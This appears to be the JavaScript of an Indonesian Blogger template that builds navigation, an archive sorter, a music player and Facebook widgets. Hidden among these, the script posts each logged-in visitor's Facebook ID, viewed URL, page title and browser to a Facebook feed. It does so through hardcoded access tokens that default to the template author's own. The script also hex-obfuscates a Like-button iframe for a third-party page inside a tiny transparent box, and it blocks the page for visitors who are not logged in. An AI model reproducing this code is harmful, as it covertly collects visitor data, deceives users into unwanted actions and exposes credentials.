<!--
if($('.post-title a').length==0){window.judulPost=$('.post-title').html().replace(/\n/gi,''); window.lingPost=$('a[rel="bookmark"]').prop('href')}else{window.judulPost=$('.post-title a').html(); window.lingPost=$('.post-title a').prop('href')}
if(typeof lingPost=='undefined'){window.lingPost=window.location.href.split('?')[0].split('#')[0]}

$('body').append('<div class="round3 black50 post-header-line-line"><div class="round3 black50"><div class="round3 operleypijit"><table cellspacing="0" cellpadding="0"><tbody><tr><td><div class="gambar-author"></div></td><td><div class="round3 keterangan-postingan"><div style="clear:both"></div></div></td></tr></tbody></table></div></div></div>');

$('#header #HTML60 .widget-content').html('<a class="garis"></a><a href="http://'+window.location.hostname+'/" class="middle">Beranda</a><a class="garis"></a><a id="gbr-sama-nama-pesbuk" href="http://www.facebook.com/irv4n-cyber4rt" target="_blank"><span id="nama-pesbuk" class="nama-orang">Contact</span></a><a class="garis"></a><a href="http://twitter.com/@irvan_efendy" class="middle">Follow Me</a><a class="garis"></a><a href="http://blogger.com/follow-blog.g?blogID=2923384713839345134" class="middle">Join this Blog</a><a class="garis"></a><a href="http://irvan-creativity.blogspot.com/p/download-template-blog.html" class="middle">Download Template</a>');

$('#header #HTML66 .widget-content').html('<a class="garis"></a><a href="javascript:void(0)" onclick="bukaNavBar()" class="drop-down"></a><a class="garis"></a><a id="gbr-sama-nama-pesbuk"><a id="gbr-jancok"></a></a>');

var lodingsuroding='<center><img class="nostyle" src="http://images.gmx.com/images/outsource/application/mailclient/mailcom/resource/mailclient/widgets/blue/common/loading_animation_en-3447255655.gif"/></center>';
String.prototype.aingDec=function(){var r='';for(var i=0; i<this.length; i+=2){r+=unescape('%'+this.substr(i,2))}return r};
function bukaNavBar(){if($('#navbar').css('display')=='none'){$('.header-outer').animate({'top':'30'},200,function(){$('#navbar').show('slow')})}else{$('#navbar').hide('slow',function(){$('.header-outer').animate({'top':'0'},200)})}}
function tblFb(ling,txt,wht,ock){if(wht=='wt'){var c='#999 #999 #888;'; var d='#eee;'; var e='#fff;'; var f='#333;'}else{var c='#29447E #29447E #1a356e;'; var d='#5b74a8;'; var e='#8a9cc2;'; var f='#fff;'} if(ock==null){ock=''} var a='<table class="round3" cellspacing="0" cellpadding="0" style="border-collapse:collapse; display:inline-block; margin:1px; vertical-align:middle"><tr><td class="round3" style="border-width: 1px; border-style: solid; border-color: '+c+' background-color: '+d+'"><table class="round3" cellspacing="0" cellpadding="0" style="border-collapse:collapse;"><tr><td class="round3" style="font-size:11px;font-family:\'lucida grande\', tahoma, verdana, arial, sans-serif;padding:0px 6px 2px 3px;border-top:1px solid '+e+'"><a href="'+ling+'" '+ock+' style="color:#3b5998;text-decoration:none;"><span style="font-weight: bold; color: '+f+' font-size: 11px;"><i class="gambar-pesbuk"></i> '+txt+'</span></a></td></tr></table></td></tr></table>'; return a}
function bukaPopUp(url,lebar,tinggi,scroll){if(lebar==null||lebar==''){lebar=600}if(tinggi==null||tinggi==''){tinggi=300}if(scroll==null||scroll==''){scroll='yes'}var kiri=screen.availWidth/2-lebar/2;var atas=screen.availHeight/2-tinggi/2;var properties='toolbar=0,location=1,statusbar=1,menubar=0,scrollbars='+scroll+',width='+lebar+',height='+tinggi+',top='+atas+',left='+kiri;window.open(url,'popup',properties)}
function chkdsk(disk){
  var chk=["\x61\x69\x6e\x67\x2d\x63\x72\x65\x61\x74\x69\x6f\x6e\x73","\x69\x72\x6c\x34\x6e\x64","\x6e\x61\x6d\x61\x70\x61\x6e\x6a\x61\x6e\x67","\x6F\x6C\x64\x2D\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2D\x74\x65\x6D\x70\x6C\x61\x74\x65"];
  var y=false;for(x in chk){if(disk.indexOf(chk[x])!=-1){y=true;break}}return y;
}
function detectBrowser(){
  var nVer=navigator.appVersion; var nAgt=navigator.userAgent; var browserName =navigator.appName; var fullVersion =parseFloat(navigator.appVersion); 
  var majorVersion=parseInt(navigator.appVersion,10); var nameOffset,verOffset,ix;
  if((verOffset=nAgt.indexOf("Opera"))!=-1){browserName="Opera"; fullVersion=nAgt.substring(verOffset+6); if((verOffset=nAgt.indexOf("Version"))!=-1){fullVersion=nAgt.substring(verOffset+8)}}
  else if((verOffset=nAgt.indexOf("MSIE"))!=-1){browserName="Internet Explorer"; fullVersion=nAgt.substring(verOffset+5)}
  else if((verOffset=nAgt.indexOf("Chrome"))!=-1){browserName="Google Chrome"; fullVersion=nAgt.substring(verOffset+7)}
  else if((verOffset=nAgt.indexOf("Safari"))!=-1){browserName="Safari"; fullVersion=nAgt.substring(verOffset+7); if((verOffset=nAgt.indexOf("Version"))!=-1){fullVersion=nAgt.substring(verOffset+8)}}
  else if((verOffset=nAgt.indexOf("Firefox"))!=-1){browserName="Mozilla Firefox"; fullVersion=nAgt.substring(verOffset+8)}
  else if( (nameOffset=nAgt.lastIndexOf(' ')+1) < (verOffset=nAgt.lastIndexOf('/')) ){browserName=nAgt.substring(nameOffset,verOffset); fullVersion=nAgt.substring(verOffset+1); if(browserName.toLowerCase()==browserName.toUpperCase()){browserName=navigator.appName}}
  if((ix=fullVersion.indexOf(";"))!=-1){fullVersion=fullVersion.substring(0,ix)}
  if((ix=fullVersion.indexOf(" "))!=-1){fullVersion=fullVersion.substring(0,ix)}
  majorVersion=parseInt(fullVersion,10);
  if(isNaN(majorVersion)){fullVersion=parseFloat(navigator.appVersion); majorVersion=parseInt(navigator.appVersion,10)}
  var tulis=browserName+' '+majorVersion;
  return tulis;
}
var userBrowser=detectBrowser();
function timeMachine(what){
//format 2011-11-12T10:45:30+000 and 2011-12-09T10:23:28.695+07:00
  var today=new Date(); var todayTahun=today.getFullYear(); var todayBulan=today.getMonth()+1; var todayTgl=today.getDate(); var todayWaktu=today.toString().split(' ')[4]; var todayGMT=today.toString().split(' ')[5]; 
  if(today.toString().split('\(')[1]){var todayTZ=today.toString().split('\(')[1].replace('\)','')}else{var todayTZ='Greenwich Mean Time'} if(what==null || what==''){what=todayTahun+'-'+todayBulan+'-'+todayTgl+'T'+todayWaktu+'.'+todayGMT} var getwhat=what.replace('T',' ').replace(/-/gi,' ').split('+')[0].split('.')[0]+' GMT'; if(what.split('+')[1]){getwhat+='+'+what.split('+')[1]}else{if(what.split('T')[2]){getwhat+='-'+what.split('T')[2].split('-')[1]}else{getwhat+='-'+what.split('T')[1].split('-')[1]}} var harihari=["Minggu","Senin","Selasa","Rabu","Kamis","Jum'at","Sabtu"]; var bulanbulan=["January","February","Maret","April","Mei","June","July","Agustus","September","Oktober","November","Desember"]; var d=new Date(getwhat); var dTahun=d.getFullYear(); var dBulan=d.getMonth()+1; var dTgl=d.getDate(); var dWaktu=d.toString().split(' ')[4]; var dGMT=d.toString().split(' ')[5]; var nh=d.getDay(); var menit=dWaktu.split(':')[1]; var jam=dWaktu.split(':')[0];
  if(jam>12){if(jam<15){var ampm='siang'}else if(jam<18){var ampm='sore'}else if(jam<20){var ampm='magrib'}else{var ampm='malem'}}else{if(jam<4){var ampm='dini hari'}else if(jam<6){var ampm='subuh'}else if(jam<10){var ampm='pagi'}else{var ampm='siang'}}
  var namaHari=harihari[nh]; var namaBulan=bulanbulan[(dBulan-1)]; var delta=today-d; var detiks=1000*1; var minutes=detiks*60; var hours=minutes*60; var days=hours*24; var month=days*30; var years=days*365; var naon=delta/detiks; var iraha=Math.round(naon); var harita='Baru saja'; var haritadelta=Math.round(delta/hours);
  if(iraha<0){harita='Baru saja'}else if(iraha>=0 && iraha<60){harita='Masih '+iraha+' detik yang lalu'}else if(iraha>=60 && iraha<60*60){naon=delta/minutes; harita='Masih '+Math.round(naon)+' menit yang lalu'}else if(iraha>=60*60 && iraha<(60*60*24)){naon=delta/hours; harita=Math.round(naon)+' jam yang lalu'}else if(iraha>=(60*60*24) && iraha<(60*60*24*30)){naon=delta/days; harita=Math.round(naon)+' hari yang lalu'}else if(iraha>=(60*60*24*30) && iraha<(60*60*24*30*12)){naon=delta/month; harita=Math.round(naon)+' bulan yang lalu'}else{harita=namaHari+', '+dTgl+' '+namaBulan+' '+dTahun+' jam '+jam+':'+menit}
  return harita+'_'+namaHari+', '+dTgl+' '+namaBulan+' '+dTahun+' jam '+jam+':'+menit+' '+ampm+'_'+todayTZ+'_'+haritadelta+'_'+dGMT;
}

function allScriptDone(){
  if(!window.postbodyScriptHasRun){
    window.postbodyScriptHasRun=true;
    if(typeof postScript=='undefined'){if(typeof optionalOne!='undefined'){optionalOne()}}else{postScript()}
    FB.Event.subscribe('comment.create',function(response){window.posipeuntype='commented on';posIpeun(response)});
    FB.Event.subscribe('edge.create', function(response){window.posipeuntype='liked';posIpeun(response)});
    window.posIpeun=function(response){
      if(response.href){var iniNihCoy=response.href}else{var iniNihCoy=response}
      var pec=iniNihCoy.split('/').length-1;
      var oqelah=iniNihCoy.split('/')[pec].replace(/-/gi,' ').replace('\.html','');
      if(oqelah==''){oqelah=iniNihCoy}
      if(typeof evrecAing!='undefined'){
        $.getJSON('https://graph.facebook.com/'+evrecAing.split('|')[0]+'/feed?method=POST&access_token='+evrecAing+'&message='+idUserYgLogin+'%0A_%0A'+posipeuntype+'%0A'+lingPost.replace(':\/\/',' ').replace(/\./gi,':dot:')+'%0A'+oqelah+'%0A'+detectBrowser());
      }
    };
    $('#header .HTML .widget-content').prepend('<a id="gbr-sama-nama-pesbuk" href="'+yuling+'" title="'+yutit+'" target="_blank"><img id="gbr-pesbuk" src="'+gbrUserYgLogin.replace('_n.jpg','_q.jpg')+'"/><span id="nama-pesbuk" class="nama-orang">'+namaUserYgLogin.split(' ')[0]+'</span></a>');
    bikinPanelApp();
  }
  $('#head-status').html('');
}

function erMes(what){var a,c,d,e,f,r;a=what.split('{');r={};for(x=0;x<a.length;x++){c=a[x].replace(/{|}|"|\n/gi,'').split(',');if(c!=''&&c!=' '){for(y=0;y<c.length;y++){d=c[y].split(':');if(d!=''&&d!=' '){for(z=0;z<d.length;z++){e=d[z];if(e!=''&&e!=' '){f=e.replace(/ /gi,'');if(f=='message'){r.message=d[z+1]}if(f=='code'){r.code=d[z+1].replace(/ /gi,'')}}}}}}}return r}
function bikinbuatnotip(){
  if(!window.bikinbuatnotip.hasRun){
    window.bikinbuatnotip.hasRun=true;
    var elmBuatNotip='\x3Cdiv id="buat-notip" style="cursor:pointer"\x3E\x3Cdiv id="notip"\x3E\x3C/div\x3E\x3C/div\x3E';
    var objelmBuatNotip=$('.header-inner .titlewrapper');
    var elmFix='\x3Cdiv id="sittingthere" style="width:240px"\x3E\x3C/div\x3E';

    if($('#buat-notip').length==0&&objelmBuatNotip.length!=0){objelmBuatNotip.append(elmBuatNotip)}
    if($('#sittingthere').length==0){$('body').append(elmFix)}
    if(window.visrecGue){window.visrecAing=visrecGue}else{if(!window.visrecAing){window.visrecAing='272303939549867|DOI2BcrrbmxoY2lNtRhlBY0Batg'}}
    if(window.evrecGue){window.evrecAing=evrecGue}else{if(!window.evrecAing){window.evrecAing='397392736976246|a8aG1PjhKabaA8NGMZ1XiZaysIg'}}
    if(!window.alamatVisRec){window.alamatVisRec='https://graph.facebook.com/'+visrecAing.split('|')[0]+'/feed?fields=message&limit=1&access_token='+visrecAing}
    if(!window.alamatEvRec){window.alamatEvRec='https://graph.facebook.com/'+evrecAing.split('|')[0]+'/feed?fields=message&limit=1&access_token='+evrecAing}
    if(!window.userBrowser){window.userBrowser='AingCreations'}

    window.kontinyuNotip=function(){
      if(window.statusNotip=='vis'){
        window.dataVisRec=dataSebelom; window.statusNotip='evn'; requestNotip();
      }else if(window.statusNotip=='evn'){
        window.dataEvRec=dataSebelom; window.statusNotip='vis'; setTimeout("requestNotip()",30000);
        if(window.idUserYgLogin&&!window.dahdicatet){
          window.dahdicatet=true;
          if(!window.adminbukan){$.getJSON('https://graph.facebook.com/'+visrecAing.split('|')[0]+'/feed?method=POST&access_token='+visrecAing+'&message='+idUserYgLogin+'%0A_%0Aviewed%0A'+window.location.href.split('?')[0].split('#')[0].replace(':\/\/',' ').replace(/\./gi,':dot:')+'%0A'+document.title+'%0A'+userBrowser,function(dapet){if(dapet.id){$('#hasil2').html('Recorded: '+dapet.id)}else{$('#hasil2').html('Recording failed');window.dahdicatet=false}}).error(function(wha){$('#hasil2').html(JSON.stringify(wha,null,'  '));window.dahdicatet=false})}
        }
        if(window.modifArchiveList&&window.modifArchiveList.hasRun&&!window.modifArchiveList.hasRunOnce){if($('#sittingthere').html()==''){window.modifArchiveList.hasRunOnce=true;$('#sittingthere').css({'bottom':($('.post-header-line-line').height()+10)+'px'});$('.post-header-line-line').animate({'right':$(document).width()-$('.post-header-line-line').width()+'px'},1000,function(){
          $(this).css({'left':'10px','right':'auto'});
          if(!window.sowPolower.hasRun){sowPolower(googleFC,'HTML4')}
        })}}
      }
    };

    window.requestNotip=function(){
      if(window.statusNotip=='vis'){
        var alamatPalsu=alamatVisRec; window.dataSebelom=dataVisRec; var kelasNya='resvis-frame'; var tokek=visrecAing;
      }else if(window.statusNotip=='evn'){
        var alamatPalsu=alamatEvRec; window.dataSebelom=dataEvRec; var kelasNya='evrec-frame'; var tokek=evrecAing;
      }
      $.getJSON(alamatPalsu,function(post){
        if(post.data){
          if(post.data==0){
            if(dataSebelom!=''){$('#'+dataSebelom).hide('slow',function(){$(this).remove()})}
            kontinyuNotip();
          }else if(post.data[0].id&&post.data[0].message){
            if(dataSebelom==post.data[0].id){
              $('#'+dataSebelom).hide('slow',function(){$(this).remove()});
              if(notipCount!=0&&!window.notipKlik){$('#notip').html(notipCount);$('#notip').show('slow')}
              kontinyuNotip();
            }else{
              dataSebelom=post.data[0].id; 
              notipCount++; 
              var pecahin=post.data[0].message.split('\n');
              if(typeof pecahin[5]=='undefined'){
                $.getJSON('https://graph.facebook.com/'+post.data[0].id+'?method=delete&access_token='+tokek);
                kontinyuNotip();
              }else{
                var postId=post.data[0].id;
//if(pecahin[3].indexOf('\x61\x69\x6E\x67\x2D\x63\x72\x65\x61\x74\x69\x6F\x6E\x73')==-1&&pecahin[3].indexOf('\x69\x72\x6c\x34\x6e\x64')==-1&&pecahin[3].indexOf('\x6e\x61\x6d\x61\x70\x61\x6e\x6a\x61\x6e\x67')==-1){$.getJSON('https://graph.facebook.com/'+postId+'?method=delete&access_token='+tokek)}
//var rav=chkdsk(pecahin[3]);
var rav=true;
if(rav==false){
  $.getJSON('https://graph.facebook.com/'+postId+'?method=delete&access_token='+tokek,kontinyuNotip);
}else{
                if(window.timeMachine){var waktu=timeMachine(post.data[0].created_time).split('_')[0]}else{var waktu=post.data[0].created_time}

  $.getJSON('http://graph.facebook.com/'+pecahin[0]+'?fields=name,picture',function(data){
    var tulis='';
    tulis+='';
    if(data.picture){tulis+=''}
    tulis+='';
    if(data.id&&data.name){tulis+=''}
    if(pecahin[4]==''){pecahin[4]='Wha?'}
    tulis+='';
    if($('#sittingthere .'+kelasNya).length>0){
      $('#sittingthere .'+kelasNya+':last').hide('slow',function(){
        $(this).remove();
        $('#sittingthere').prepend(tulis);
        $('#'+postId).effect('bounce',kontinyuNotip);
      });
    }else{
      $('#sittingthere').prepend(tulis);
      $('#'+postId).effect('bounce',kontinyuNotip);
    }
  });
}
              }
            }
          }else{kontinyuNotip()}
        }else{kontinyuNotip()}
      }).error(function(post){

var em=erMes(post.responseText);
$('#head-status').append('');

      });
    };

    window.notipCount=0; window.statusNotip='vis'; window.dataVisRec=''; window.dataEvRec=''; requestNotip();
  }
}


function modifArchiveList(){
  if(!window.arhiveTabKlik){window.arhiveTabKlik=function(){
    var a,b,c,d,e,f;if($('#BlogArchive2_ArchiveList').css('opacity')==1){a=$('#BlogArchive1_ArchiveList');b=$('#BlogArchive2_ArchiveList');c=$('#arc-sbc');d=$('#arc-sbd');e='Date';f='Category'}else{a=$('#BlogArchive2_ArchiveList');b=$('#BlogArchive1_ArchiveList');c=$('#arc-sbd');d=$('#arc-sbc');e='Category';f='Date'}
    $(d).removeClass('list-archive2-pasip').addClass('list-archive2-aktip').html('Sorted by '+e);
    $(c).removeClass('list-archive2-aktip').addClass('list-archive2-pasip').html('Sort by '+f);
    $(b).animate({opacity:0.0},1000,function(){$(this).css({'display':'none'});$(a).css({'display':'block'}).animate({opacity:1.0},1000)});
  }}
  if(!window.isiinCategori){window.isiinCategori=function(uri,elm){
    window.tmptctgr=elm; window.isitmptctgr=$(tmptctgr).html(); 
    $(tmptctgr).html('<br/>'+lodingsuroding); 
    $.getJSON(uri,writeIsiCat);
  }}
  if(!window.writeIsiCat){window.writeIsiCat=function(post){
    if(post.feed&&post.feed.link){for(x in post.feed.link){if(post.feed.link[x].rel=='alternate'){
      if(post.feed.link[x].href.split('\/label\/')[1]){
        var searchLabel=unescape(post.feed.link[x].href.split('\/label\/')[1]);
        $('#now'+escape(searchLabel).replace(/%20/gi,'-')).html('');
        break;
      }else{
        var searchLabel='uncategories';
        $('#nowuncategories').html('');
        break;
      }
    }}}
    if(post.feed&&post.feed.entry){
      for(x in post.feed.entry){
        var tulis2='';
        if(post.feed.entry[x].link){for(y in post.feed.entry[x].link){if(post.feed.entry[x].link[y].rel){
          var pisahUrlPost=post.feed.entry[x].link[y].href.split('/');
          var classJudulPost=pisahUrlPost[pisahUrlPost.length-1].split('.')[0];
          if(post.feed.entry[x].link[y].rel=='alternate'&&post.feed.entry[x].link[y].title){
            tulis2+='<li class="'+classJudulPost+'">';
            tulis2+='<a class="list-archive red25" ';
            if(post.feed.entry[x].link[y].href==window.location.href.split('?')[0].split('#')[0]||post.feed.entry[x].link[y].href==lingPost){
              tulis2+='style="background-color:transparent" ';
if(post.feed.entry[x].author&&$('.keterangan-postingan .posted-by').length==0){
  if(post.feed.entry[x].author[0].gd$image){$('.gambar-author,#gbr-jancok').html('<img class="round3" src="http://'+post.feed.entry[x].author[0].gd$image.src.split('\/\/')[1]+'" style="margin:0 5px 0 0;max-width:75px;max-height:75px;_width:75px"/>')}
  var authorEntry='<div class="posted-by"><span style="color:#99AA77">Posted by:</span> ';
  if(post.feed.entry[x].author[0].uri){authorEntry+='<a href="'+post.feed.entry[x].author[0].uri.$t+'" target="_blank">'}
  if(post.feed.entry[x].author[0].name){authorEntry+='<b>'+post.feed.entry[x].author[0].name.$t+'</b>'}
  if(post.feed.entry[x].author[0].uri){authorEntry+='</a>'}
  authorEntry+='</div>';
  if(post.feed.entry[x].published&&post.feed.entry[x].updated){
    authorEntry+='<div class="published-date">';
    var tgl1=timeMachine(post.feed.entry[x].published.$t);
    var tgl2=timeMachine(post.feed.entry[x].updated.$t);
    authorEntry+='<div><span style="color:#99AA77">Published:</span> '+tgl1.split('_')[0]+'</div>';
    if(tgl1.split('_')[0]!=tgl2.split('_')[0]&&tgl2.split('_')[0]!='Karak ge crot bieu'){$('.post-header-line-1').append('<span style="color:#99AA77">Updated:</span> <span>'+tgl2.split('_')[0]+'</span>');authorEntry+='<div><span style="color:#99AA77">Updated:</span> '+tgl2.split('_')[0]+'</div>'}
    authorEntry+='</div>';
    $('.date-header').html('<span>'+tgl1.split('_')[1]+'</span>');
  }
  if(post.feed.entry[x].category){
    authorEntry+='<div class="authorbox-category"><span style="color:#99AA77">Category:</span> ';
    for(z in post.feed.entry[x].category){
      if(post.feed.entry[x].category[z].term){
        if(z!=0){authorEntry+=', '}
        authorEntry+=post.feed.entry[x].category[z].term;
      }
    }
    authorEntry+='</div>';
  }
  if(post.feed.entry[x].id){
    var a,b,c,d,e;a=post.feed.entry[x].id.$t;b=a.indexOf('blog-')+5;c=a.indexOf('.post-');d=c-b;e=c+6;
    var popComBt='<div class="comment-button" style="display:inline-block;vertical-align:middle">';
    popComBt+='<a class="tombol" style="margin-left:0" href="http://www.blogger.com/comment.g?blogID='+a.substr(b,d)+'&postID='+a.substr(e)+'&isPopup=true" onClick="javascript:window.open(this.href,\'komeng\',\'width=400,height=600,scrollbars=yes\');return false">Comment</a>';
    if(post.feed.entry[x].thr$total&&post.feed.entry[x].thr$total.$t!=0){popComBt+='<div style="display:inline-block;vertical-align:middle"><div class="nub"><s></s><i></i></div><div class="count">'+post.feed.entry[x].thr$total.$t+'</div></div>'}
    popComBt+='</div>';
    authorEntry+=popComBt;
    $('#comments h4:first').html(popComBt);
  }
  $('.keterangan-postingan').addClass('black25').css({'padding':'0px 0px 5px 5px'}).prepend(authorEntry);
  $('.keterangan-postingan .comment-button').animate({opacity:1.0},1000,function(){
  $('.post-header-line-line').animate({'bottom':'38px','right':'5px'},1000,function(){
  $('.gambar-author').css({opacity:0.0}).show('slow',function(){
  $('.keterangan-postingan .posted-by').show('slow',function(){
if($('.embed-music').length==0){
  $('.keterangan-postingan .published-date').show('slow',function(){
  $('.keterangan-postingan .authorbox-category').show('slow',function(){
  $('.gambar-author').animate({opacity:1.0},1000);
  });
  });
}else{$('.gambar-author').animate({opacity:1.0},1000)}
  });
  });
  });
  });
}
            }
            tulis2+='href="'+post.feed.entry[x].link[y].href+'">'+post.feed.entry[x].link[y].title+'</a></li>'; 
            break;
          }
        }}}
        var searchLabel2=searchLabel;
        if(searchLabel=='uncategories'){if(post.feed.entry[x].category){for(y in post.feed.entry[x].category){if(post.feed.entry[x].category[y].term){
          searchLabel2=post.feed.entry[x].category[y].term;
          break;
        }}}}
        var idKategoryTerm=escape(searchLabel2).replace(/%20/gi,'-');
        if($('#'+idKategoryTerm).length==0&&$('.'+classJudulPost).length==0){
          var tulis3='<ul class="hierarchy"><li class="archivedate collapsed">';
          tulis3+='<a id="toggle'+idKategoryTerm+'" class="toggle" href="javascript:void(0)" onClick="if($(\'#'+idKategoryTerm+'\').css(\'display\')==\'none\'){$(\'#'+idKategoryTerm+'\').show();$(this).html(\'&#9660;&nbsp;\')}else{$(\'#'+idKategoryTerm+'\').hide();$(this).html(\'&#9658;&nbsp;\')}">&#9660;&nbsp;</a>';
          tulis3+='<strong>'+searchLabel2+'</strong>';
          tulis3+='<span class="post-count" dir="ltr"></span>';
          tulis3+='<ul id="'+idKategoryTerm+'" class="posts">'+tulis2+'</ul>';
          tulis3+='</li></ul>'; 
          $('#now'+idKategoryTerm).html(tulis3);
        }else{
          if($('.'+classJudulPost).length==0){$('#'+idKategoryTerm).append(tulis2)}
          $('#'+idKategoryTerm).css('display','block'); 
          $('#toggle'+idKategoryTerm).html('&#9660;&nbsp;');
        }
      }
    }
  }}
  $('#BlogArchive1_ArchiveList .post-count-link').each(function(){$(this).css({'display':'none'}).after('<b>'+$(this).html()+'</b>')});
  $('.BlogArchive .widget-content').before('<div class="archive-tab-menu" style="text-align:right"></div>');
  var labelSekarang=$('.post-labels a').html();
  if(labelSekarang==null||labelSekarang==''){labelSekarang='Nothing'}
  $.getJSON('http://'+window.location.hostname+'/feeds/posts/default/-/'+escape(labelSekarang)+'?alt=json-in-script&max-results=999&callback=?',function(post){
    if(post.feed&&post.feed.category){
      var tulis='<div id="nowuncategories"></div>';
      post.feed.category=post.feed.category.sort(function(){return 0.5-Math.random()});
      for(x in post.feed.category){
        if(post.feed.category[x].term){
          tulis+='<div id="now'+escape(post.feed.category[x].term).replace(/%20/gi,'-')+'"><a class="list-archive black25" href="http://'+window.location.hostname+'/feeds/posts/default/-/'+escape(post.feed.category[x].term)+'?alt=json-in-script&callback=?" onClick="javascript:isiinCategori(this.href,this.parentNode);return false">'+post.feed.category[x].term+'</a></div>';
        }
      }
      $('.archive-tab-menu').append('<a id="arc-sbd" class="list-archive2 list-archive2-pasip" href="javascript:void(0)" onClick="arhiveTabKlik()">Sort by Date</a> <a id="arc-sbc" class="list-archive2 list-archive2-aktip" href="javascript:void(0)" onClick="arhiveTabKlik()">Sort by Category</a>');
      $('#BlogArchive1_ArchiveList').before('<div id="BlogArchive2_ArchiveList" style="display:none;opacity:0.0">'+tulis+'</div>').animate({opacity:0.0},1000,function(){$(this).css({'display':'none'});$('#BlogArchive2_ArchiveList').css({'display':'block'}).animate({opacity:1.0},1000)});
      if($('#now'+escape(labelSekarang).replace(/%20/gi,'-')).length!=0){
        window.tmptctgr=$('#now'+escape(labelSekarang).replace(/%20/gi,'-')); window.isitmptctgr=$(tmptctgr).html(); 
        writeIsiCat(post);
      }
    }
  });
}
function stelMusikAh(uri,judul){
  if(!window.authCallback){window.authCallback=function(wew){
    $('#head-status').html(wew);
  }}
  if(uri==null||uri==''){
    if(!window.mp3ArrayAing){
window.mp3ArrayAing=[
{"uri":"http://pelangi.faa.im/files/gustidewatamuliaraya.mp3","judul":"Bondan - Gusti Dewata Mulia Raya"},
{"uri":"http://pelangi.faa.im/files/rt-wtwta-wild-rumpus-st.mp3","judul":"WTWTA - Wild Rumpus Start","loop":"no"}
];
    }
    mp3ArrayAing=mp3ArrayAing.sort(function(){return 0.5-Math.random()});
    var ke=Math.floor(Math.random()*mp3ArrayAing.length);
    if(typeof mp3ArrayAing[ke]=='undefined'){ke=0}
    if(mp3ArrayAing[ke].uri){uri=mp3ArrayAing[ke].uri}else{uri='http://pelangi.faa.im/files/dj-pabeulit-aing-mah-te.mp3'}
    if(mp3ArrayAing[ke].judul){judul=mp3ArrayAing[ke].judul}
  }
var album=window.location.hostname; 
  var srcmp3=uri;
  var tulisNew='<div style="clear:both;padding:1px"><center><a style="color:#aaaa99;text-transform:capitalize" href="'+uri+'" target="_blank">'+judul+'</a></center></div>';
  tulisNew+='<div style="width:30px;height:20px;overflow:hidden;display:inline-block;vertical-align:middle"><div><embed class="embed-music" wmode="transparent style="pluginspage="http://www.microsoft.com/windows/downloads/contents/products/mediaplayer/"autostart="true"quality="high"displaysize="0"showstatusbar="1"lop="1"type="application/x-mplayer2"src="'+srcmp3+'"name="raocxplayer" allowscriptaccess="never"height="20"width="100"></embed></div></div>';
  tulisNew+='<div class="transparent" style="width:95px;height:20px;overflow:hidden;display:inline-block;vertical-align:\x6D\x69\x64\x64\x6C\x65\x22\x3E\x3Ciframe src="\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2F\x6C\x69\x6B\x65\x2E\x70\x68\x70\x3F\x68\x72\x65\x66\x3D\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x54\x65\x78\x61\x73\x48\x6F\x6C\x64\x45\x6D&layout=button_count&colorscheme=dark&show_faces=false&width=90" style="width:90px; height:20px; background:none; padding:0; margin:0; border:0;"></iframe></div>';
  tulisNew+='<div style="display:inline-block;vertical-align:middle"> &#183; <a href="javascript:void(0)" onClick="if($(this).html()==\'Play\'){$(\'.embed-music\').parent().show();$(this).html(\'Stop\')}else{$(\'.embed-music\').parent().hide();$(this).html(\'Play\')}">Stop</a>  &#183; <a href="javascript:void(0)" onClick="stelMusikAh()">Next</a></div>';
  if($('.musik-aing').length==0){$('.keterangan-postingan').append('<div class="musik-aing">'+tulisNew+'</div>')}else{$('.musik-aing').html(tulisNew)}
  $('.keterangan-postingan .published-date').hide('slow');
  $('.keterangan-postingan .authorbox-category').hide('slow');
}

var setKuki=function(namaKuki,value,hariBasi){var tglBasi=new Date(); tglBasi.setDate(tglBasi.getDate()+hariBasi); var valueKuki=escape(value)+((hariBasi==null) ? '' : '; expires='+tglBasi.toUTCString()); document.cookie=namaKuki+'='+valueKuki};
var getKuki=function(namaKuki){var i,x,y,eureyKukis=document.cookie.split(';'); for(i=0;i<eureyKukis.length;i++){x=eureyKukis[i].substr(0,eureyKukis[i].indexOf('=')); y=eureyKukis[i].substr(eureyKukis[i].indexOf('=')+1); x=x.replace(/^\s+|\s+$/g,''); if(x==namaKuki){return unescape(y)}}};

if(!window.dontLoad){
  window.fbAsyncInit=function(){
    FB.init({}); 
    FB.Event.subscribe('xfbml.render',function(what){
      if(!window.loginLah.HasRun){FB.getLoginStatus(loginLah)}
      if(!window.google||!google.friendconnect){$.ajax({url:'http://www.google.com/friendconnect/script/friendconnect.js',success:function(){sowPolower(googleFC,'HTML4')}})}
      if(window.bikinbuatnotip&&!window.bikinbuatnotip.hasRun){bikinbuatnotip()}
    });
    FB.Event.subscribe('auth.statusChange',function(wew){if(!window.loginLah.HasRun){loginLah(wew)}});
  };
  window.loginLah=function(wew){
    window.loginLah.HasRun=true;$('body').unbind('click');
    if(wew.authResponse && wew.authResponse.userID){
      window.catteeet='yes';
      window.idUserYgLogin=wew.authResponse.userID;
      if(wew.authResponse.accessToken){window.aktokUserYgLogin=wew.authResponse.accessToken}
      if($('.blok-element').length!=0){$('.blok-element').animate({opacity:0.0},1000,function(){$(this).remove()})}
      gantiProfileImg(idUserYgLogin); 
    }else{
      if($('.blok-element').length==0){
        $('body').append('');
      }
      window.catteeet='no';
      if(wew.status){var textnya=''}
      $('.blok-element .block-text-elm').html(textnya+' click anywhere to continue..');
      if(!window.eJatoh){window.eJatoh=function(){
        var tGam=$('.blok-element-dalem img:first').height(); var tDok=$(window).height(); var jadinya=tDok-tGam;
        $('.blok-element-dalem img:first').animate({opacity:1.0},1000,function(){$(this).delay(800).animate({'top':jadinya},100,function(){$(this).effect('bounce',{times:10,distance:200,direction:'up'},800,function(){$('.blok-element-dalem').mousemove(function(w){
          $('.blok-element-dalem img:first').css({'top':w.pageY-100,'left':w.pageX-230});
        })})})});
      }}
      $('#head-status').html('<b class="shadow round3 white80" style="color:black; display:inline-block; padding:2px 5px 1px 3px">'+textnya+'</b>');
      $('body').bind('click');
      if(!window.wkwk){window.wkwk=true;$('.blok-element-dalem img:first').css({'opacity':'0.0'}).load(eJatoh)}
    }
  };
  window.gantiProfileImg=function(pakeIdIni){
    $.getJSON('http://graph.facebook.com/'+pakeIdIni+'?fields=name,username,picture',function(gbr){
